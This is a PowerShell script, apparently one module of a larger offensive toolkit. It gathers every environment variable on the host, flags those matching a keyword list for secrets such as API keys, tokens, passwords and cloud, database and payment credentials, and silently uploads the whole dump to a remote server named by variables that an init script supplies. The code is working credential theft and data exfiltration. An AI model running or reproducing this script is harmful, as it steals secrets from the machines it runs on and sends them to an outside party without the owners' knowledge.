# envvars.ps1 - inherits $H, $P, $AU, $TH from init.ps1

$out = [System.Text.StringBuilder]::new()

# keywords that suggest sensitive values
$sensitive = @(
    'key','secret','token','pass','pwd','auth','cred','api',
    'private','cert','sign','salt','hash','cipher','encrypt',
    'aws','azure','gcp','github','gitlab','docker','kube',
    'db','database','mongo','mysql','postgres','redis','sql',
    'smtp','mail','twilio','stripe','paypal','slack','discord'
)

$all     = [System.Collections.Generic.List[string]]::new()
$flagged = [System.Collections.Generic.List[string]]::new()

Get-ChildItem Env: | Sort-Object Name | ForEach-Object {
    $line = "$($_.Name) = $($_.Value)"
    $all.Add($line) | Out-Null

    $lower = $_.Name.ToLower() + $_.Value.ToLower()
    foreach ($kw in $sensitive) {
        if ($lower -match $kw) {
            $flagged.Add($line) | Out-Null
            break
        }
    }
}

$out.AppendLine("[FLAGGED - possible secrets]") | Out-Null
if ($flagged.Count -gt 0) {
    $flagged | ForEach-Object { $out.AppendLine($_) | Out-Null }
} else {
    $out.AppendLine("(none found)") | Out-Null
}

$out.AppendLine("") | Out-Null
$out.AppendLine("[ALL ENVIRONMENT VARIABLES]") | Out-Null
$all | ForEach-Object { $out.AppendLine($_) | Out-Null }

$wc = New-Object Net.WebClient
$wc.Headers.Add("Authorization", $AU)
$wc.Headers.Add("Content-Type", "text/plain")
$wc.Headers.Add("X-Target", $TH)
try { $wc.UploadString("https://${H}:${P}/store/envvars", $out.ToString()) } catch {}
